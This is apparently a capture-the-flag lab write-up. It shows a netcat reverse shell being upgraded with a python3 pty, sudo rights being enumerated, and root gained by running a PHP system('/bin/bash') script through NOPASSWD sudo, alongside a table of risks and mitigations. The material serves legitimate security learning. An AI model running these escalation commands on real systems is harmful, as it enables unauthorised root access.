
After establishing our reverse shell with netcat from metasploit, we need to cement our foothold. 

Upgrade our shell to one that supports TTY

```shell-session
python -c 'import pty; pty.spawn("/bin/bash")'
```

This command fails as the system doesn't have python2 so we execute the command below

```shell-session
which python3
```

we have Python3 avaliable and from there our netcat session has escalated

```shell-session
python3 -c 'import pty; pty.spawn("/bin/bash")'
``` 

![../2. Recon/Images/Pasted image 20241007215316.png](<../2. Recon/Images/Pasted image 20241007215316.png>)

we can now run commands like sudo -l to determine permissions
![../2. Recon/Images/Pasted image 20241007220720.png](<../2. Recon/Images/Pasted image 20241007220720.png>)

Running these permissions through ChatGPT we can get a more human readable threat assessment.

| **Item**                       | **Details**                                                        |
|---------------------------------|--------------------------------------------------------------------|
| **Command**                     | `sudo /usr/bin/php`                                                |
| **User**                        | `www-data`                                                         |
| **Privileges**                  | Can run **PHP** as **any user** without needing a password (`NOPASSWD`) |

### Security Risks

| **Risk**                 | **Description**                                                                                                        |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------- |
| **Full Root Access**     | PHP can execute system commands (e.g., `system()`, `exec()`), allowing full root control.                              |
| **Privilege Escalation** | Attackers can: <ul><li>Read/modify sensitive files (e.g., `/etc/shadow`).</li><li>Open a root shell via PHP.</li></ul> |
| **Ease of Exploitation** | No password is required to run PHP scripts as root, simplifying exploitation.                                          |
| **Web Exploits**         | If `www-data` is tied to a web server, vulnerable web apps can be used to escalate privileges to root.                 |

### Exploit Example

| **PHP Script**                 | **Effect**                                  |
|--------------------------------|---------------------------------------------|
| ```php <?php system("/bin/bash"); ?> ``` | Spawns a **root shell** when run via `sudo /usr/bin/php /path/to/script.php`. |

### Mitigation

| **Recommendation**              | **Action**                                                         |
|---------------------------------|--------------------------------------------------------------------|
| **Remove NOPASSWD**             | Require a password for `sudo` or restrict specific PHP commands.   |
| **Monitor www-data**            | Track activity, especially sudo actions.                           |
| **Harden Web Applications**     | Ensure no remote code execution vulnerabilities in web apps.       |

From this info we can quickly execute the simple 2 line script below

```shell script
echo '<?php system("/bin/bash"); ?>' > /tmp/root_shell.php
sudo /usr/bin/php /tmp/root_shell.php
```

![../2. Recon/Images/Pasted image 20241007221231.png](<../2. Recon/Images/Pasted image 20241007221231.png>)

We have now established ourselves as the root user and capture the final flag.

![../2. Recon/Images/Pasted image 20241007222806.png](<../2. Recon/Images/Pasted image 20241007222806.png>)